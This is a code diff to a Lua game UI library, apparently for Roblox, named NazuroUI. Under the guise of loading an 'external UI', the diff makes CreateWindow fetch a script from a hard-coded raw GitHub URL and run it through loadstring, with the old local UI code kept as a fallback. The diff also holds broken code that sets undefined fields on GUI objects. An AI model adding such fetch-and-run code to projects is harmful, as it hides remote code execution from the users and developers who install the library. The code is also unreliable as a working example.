@@ -89,101 +89,193 @@ local function AddGradient(instance)
     return gradient
 end
 
+-- Load external UI
+local function LoadExternalUI(url)
+    local success, content = pcall(HttpService.GetAsync, HttpService, url)
+    if success then
+        local func, err = loadstring(content)
+        if func then
+            local ui = func()
+            if ui and ui:IsA("ScreenGui") then
+                ui.Name = "NazuroUI_" .. tick()
+                ui.ResetOnSpawn = false
+                ui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                ui.Parent = CoreGui
+                if RunService:IsStudio() then ui.Parent = LocalPlayer.PlayerGui end
+                return ui
+            else
+                warn("External UI script did not return a valid ScreenGui")
+            end
+        else
+            warn("Failed to loadstring external UI: " .. tostring(err))
+        end
+    else
+        warn("Failed to fetch UI from " .. url .. ": " .. tostring(content))
+    end
+    return nil
+end
+
 -- Create window
 function NazuroUI:CreateWindow(title, icon)
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "NazuroUI_" .. tick()
-    ScreenGui.ResetOnSpawn = false
-    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    ScreenGui.Parent = CoreGui
-    if RunService:IsStudio() then ScreenGui.Parent = LocalPlayer.PlayerGui end
+    local externalUIUrl = "https://raw.githubusercontent.com/Gxwebhost/te/refs/heads/main/2r22.lua"
+    local ScreenGui = LoadExternalUI(externalUIUrl)
 
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 600, 0, 400)
-    MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
-    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    MainFrame.BackgroundColor3 = NazuroUI.Theme.Primary
-    MainFrame.ClipsDescendants = true
-    RoundedCorners(MainFrame)
-    AddStroke(MainFrame, 2, NazuroUI.Theme.Accent, 0.7)
-    AddGradient(MainFrame)
-    MainFrame.Parent = ScreenGui
+    -- Fallback to programmatic UI if external UI fails to load
+    if not ScreenGui then
+        ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "NazuroUI_" .. tick()
+        ScreenGui.ResetOnSpawn = false
+        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        ScreenGui.Parent = CoreGui
+        if RunService:IsStudio() then ScreenGui.Parent = LocalPlayer.PlayerGui end
 
-    local TitleBar = Instance.new("Frame")
-    TitleBar.Size = UDim2.new(1, 0, 0, 50)
-    TitleBar.BackgroundColor3 = NazuroUI.Theme.Secondary
-    RoundedCorners(TitleBar, 6)
-    TitleBar.Parent = MainFrame
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Size = UDim2.new(0, 600, 0, 400)
+        MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
+        MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+        MainFrame.BackgroundColor3 = NazuroUI.Theme.Primary
+        MainFrame.ClipsDescendants = true
+        RoundedCorners(MainFrame)
+        AddStroke(MainFrame, 2, NazuroUI.Theme.Accent, 0.7)
+        AddGradient(MainFrame)
+        MainFrame.Parent = ScreenGui
 
-    local TitleLabel = Instance.new("TextLabel")
-    TitleLabel.Size = UDim2.new(1, -60, 1, 0)
-    TitleLabel.Position = UDim2.new(0, 50, 0, 0)
-    TitleLabel.BackgroundTransparency = 1
-    TitleLabel.Text = title or "Nazuro UI"
-    TitleLabel.TextColor3 = NazuroUI.Theme.Text
-    TitleLabel.TextSize = 20
-    TitleLabel.Font = Enum.Font.GothamBold
-    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
-    TitleLabel.Parent = TitleBar
+        local TitleBar = Instance.new("Frame")
+        TitleBar.Size = UDim2.new(1, 0, 0, 50)
+        TitleBar.BackgroundColor3 = NazuroUI.Theme.Secondary
+        RoundedCorners(TitleBar, 6)
+        TitleBar.Parent = MainFrame
 
-    local TitleIcon = Instance.new("ImageLabel")
-    TitleIcon.Size = UDim2.new(0, 30, 0, 30)
-    TitleIcon.Position = UDim2.new(0, 10, 0.5, -15)
-    TitleIcon.BackgroundTransparency = 1
-    TitleIcon.Image = icon or "rbxassetid://7072706764"
-    TitleIcon.Parent = TitleBar
+        local TitleLabel = Instance.new("TextLabel")
+        TitleLabel.Size = UDim2.new(1, -60, 1, 0)
+        TitleLabel.Position = UDim2.new(0, 50, 0, 0)
+        TitleLabel.BackgroundTransparency = 1
+        TitleLabel.Text = title or "Nazuro UI"
+        TitleLabel.TextColor3 = NazuroUI.Theme.Text
+        TitleLabel.TextSize = 20
+        TitleLabel.Font = Enum.Font.GothamBold
+        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TitleLabel.Parent = TitleBar
 
-    local TabButtons = Instance.new("Frame")
-    TabButtons.Size = UDim2.new(0, 150, 1, -50)
-    TabButtons.Position = UDim2.new(0, 0, 0, 50)
-    TabButtons.BackgroundColor3 = NazuroUI.Theme.Secondary
-    RoundedCorners(TabButtons, 6)
-    TabButtons.Parent = MainFrame
+        local TitleIcon = Instance.new("ImageLabel")
+        TitleIcon.Size = UDim2.new(0, 30, 0, 30)
+        TitleIcon.Position = UDim2.new(0, 10, 0.5, -15)
+        TitleIcon.BackgroundTransparency = 1
+        TitleIcon.Image = icon or "rbxassetid://7072706764"
+        TitleIcon.Parent = TitleBar
 
-    local TabButtonsLayout = Instance.new("UIListLayout")
-    TabButtonsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    TabButtonsLayout.Padding = UDim.new(0, 10)
-    TabButtonsLayout.Parent = TabButtons
+        local TabButtons = Instance.new("Frame")
+        TabButtons.Size = UDim2.new(0, 150, 1, -50)
+        TabButtons.Position = UDim2.new(0, 0, 0, 50)
+        TabButtons.BackgroundColor3 = NazuroUI.Theme.Secondary
+        RoundedCorners(TabButtons, 6)
+        TabButtons.Parent = MainFrame
 
-    local TabButtonsPadding = Instance.new("UIPadding")
-    TabButtonsPadding.PaddingLeft = UDim.new(0, 10)
-    TabButtonsPadding.PaddingTop = UDim.new(0, 10)
-    TabButtonsPadding.Parent = TabButtons
+        local TabButtonsLayout = Instance.new("UIListLayout")
+        TabButtonsLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        TabButtonsLayout.Padding = UDim.new(0, 10)
+        TabButtonsLayout.Parent = TabButtons
 
-    local ContentFrame = Instance.new("Frame")
-    ContentFrame.Size = UDim2.new(1, -150, 1, -50)
-    ContentFrame.Position = UDim2.new(0, 150, 0, 50)
-    ContentFrame.BackgroundTransparency = 1
-    ContentFrame.Parent = MainFrame
+        local TabButtonsPadding = Instance.new("UIPadding")
+        TabButtonsPadding.PaddingLeft = UDim.new(0, 10)
+        TabButtonsPadding.PaddingTop = UDim.new(0, 10)
+        TabButtonsPadding.Parent = TabButtons
 
-    local TabPageLayout = Instance.new("UIPageLayout")
-    TabPageLayout.EasingStyle = Enum.EasingStyle.Sine
-    TabPageLayout.TweenTime = 0.3
-    TabPageLayout.Parent = ContentFrame
+        local ContentFrame = Instance.new("Frame")
+        ContentFrame.Size = UDim2.new(1, -150, 1, -50)
+        ContentFrame.Position = UDim2.new(0, 150, 0, 50)
+        ContentFrame.BackgroundTransparency = 1
+        ContentFrame.Parent = MainFrame
 
-    -- Dragging functionality
-    local dragging, dragInput, dragStart, startPos
-    TitleBar.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = MainFrame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
+        local TabPageLayout = Instance.new("UIPageLayout")
+        TabPageLayout.EasingStyle = Enum.EasingStyle.Sine
+        TabPageLayout.TweenTime = 0.3
+        TabPageLayout.Parent = ContentFrame
+
+        -- Dragging functionality
+        local dragging, dragInput, dragStart, startPos
+        TitleBar.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = input.Position
+                startPos = MainFrame.Position
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
+                end)
+            end
+        end)
+        TitleBar.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+                dragInput = input
+            end
+        end)
+        UserInputService.InputChanged:Connect(function(input)
+            if input == dragInput and dragging then
+                local delta = input.Position - dragStart
+                MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+            end
+        end)
+
+        -- Assign to ScreenGui for consistency
+        ScreenGui.MainFrame = MainFrame
+        ScreenGui.TabButtons = TabButtons
+        ScreenGui.ContentFrame = ContentFrame
+        ScreenGui.TabPageLayout = TabPageLayout
+    else
+        -- Use external UI, assume it has MainFrame, TabButtons, ContentFrame, and TabPageLayout
+        -- Adjust properties to match theme
+        local MainFrame = ScreenGui:FindFirstChild("MainFrame") or ScreenGui:FindFirstChild("Main")
+        if MainFrame then
+            MainFrame.BackgroundColor3 = NazuroUI.Theme.Primary
+            MainFrame.Size = UDim2.new(0, 600, 0, 400)
+            MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
+            MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+            RoundedCorners(MainFrame)
+            AddStroke(MainFrame, 2, NazuroUI.Theme.Accent, 0.7)
+            AddGradient(MainFrame)
         end
-    end)
-    TitleBar.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
+
+        local TabButtons = ScreenGui:FindFirstChild("TabButtons") or ScreenGui:FindFirstChild("SideBar")
+        if TabButtons then
+            TabButtons.BackgroundColor3 = NazuroUI.Theme.Secondary
+            TabButtons.Size = UDim2.new(0, 150, 1, -50)
+            TabButtons.Position = UDim2.new(0, 0, 0, 50)
+            RoundedCorners(TabButtons, 6)
         end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+        local ContentFrame = ScreenGui:FindFirstChild("ContentFrame") or ScreenGui:FindFirstChild("TabContainer")
+        if ContentFrame then
+            ContentFrame.Size = UDim2.new(1, -150, 1, -50)
+            ContentFrame.Position = UDim2.new(0, 150, 0, 50)
+            ContentFrame.BackgroundTransparency = 1
         end
-    end)
+
+        local TabPageLayout = ContentFrame and ContentFrame:FindFirstChild("UIPageLayout")
+        if not TabPageLayout then
+            TabPageLayout = Instance.new("UIPageLayout")
+            TabPageLayout.EasingStyle = Enum.EasingStyle.Sine
+            TabPageLayout.TweenTime = 0.3
+            TabPageLayout.Parent = ContentFrame
+        end
+
+        -- Clear existing tab buttons to avoid conflicts
+        if TabButtons then
+            for _, child in ipairs(TabButtons:GetChildren()) do
+                if child:IsA("TextButton") or child:IsA("Frame") then
+                    child:Destroy()
+                end
+            end
+            local layout = TabButtons:FindFirstChildOfClass("UIListLayout") or Instance.new("UIListLayout")
+            layout.SortOrder = Enum.SortOrder.LayoutOrder
+            layout.Padding = UDim.new(0, 10)
+            layout.Parent = TabButtons
+
+            local padding = TabButtons:FindFirstChildOfClass("UIPadding") or Instance.new("UIPadding")
+            padding.PaddingLeft = UDim.new(0, 10)
+            padding.PaddingTop = UDim.new(0, 10)
+            padding.Parent = TabButtons
+        end
+    end
 
     -- Notification system
     local function CreateNotification(options)
@@ -231,7 +323,7 @@ function NazuroUI:CreateWindow(title, icon)
 
     -- Update tab visuals
     local function UpdateTabVisuals(selectedButton)
-        for _, button in ipairs(TabButtons:GetChildren()) do
+        for _, button in ipairs(ScreenGui.TabButtons:GetChildren()) do
             if button:IsA("TextButton") then
                 local isSelected = button == selectedButton
                 TweenService:Create(button, NazuroUI.Theme.TweenInfo, {
@@ -260,8 +352,8 @@ function NazuroUI:CreateWindow(title, icon)
         TabButton.Text = ""
         TabButton.AutoButtonColor = false
         RoundedCorners(TabButton, 6)
-        TabButton.Parent = TabButtons
-        TabButton.LayoutOrder = #TabButtons:GetChildren()
+        TabButton.Parent = ScreenGui.TabButtons
+        TabButton.LayoutOrder = #ScreenGui.TabButtons:GetChildren()
 
         local TabIcon = Instance.new("ImageLabel")
         TabIcon.Size = UDim2.new(0, 24, 0, 24)
@@ -290,7 +382,7 @@ function NazuroUI:CreateWindow(title, icon)
         TabContent.ScrollBarThickness = 4
         TabContent.ScrollBarImageColor3 = NazuroUI.Theme.Accent
         TabContent.Visible = false
-        TabContent.Parent = ContentFrame
+        TabContent.Parent = ScreenGui.ContentFrame
 
         local ContentLayout = Instance.new("UIListLayout")
         ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
@@ -303,7 +395,7 @@ function NazuroUI:CreateWindow(title, icon)
         ContentPadding.Parent = TabContent
 
         TabButton.MouseButton1Click:Connect(function()
-            for _, tab in ipairs(ContentFrame:GetChildren()) do
+            for _, tab in ipairs(ScreenGui.ContentFrame:GetChildren()) do
                 if tab:IsA("ScrollingFrame") then tab.Visible = false end
             end
             TabContent.Visible = true
@@ -311,7 +403,7 @@ function NazuroUI:CreateWindow(title, icon)
             TabContent.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 20)
         end)
 
-        if #TabButtons:GetChildren() == 1 then
+        if #ScreenGui.TabButtons:GetChildren() == 1 then
             TabButton.MouseButton1Click:Fire()
         end
 
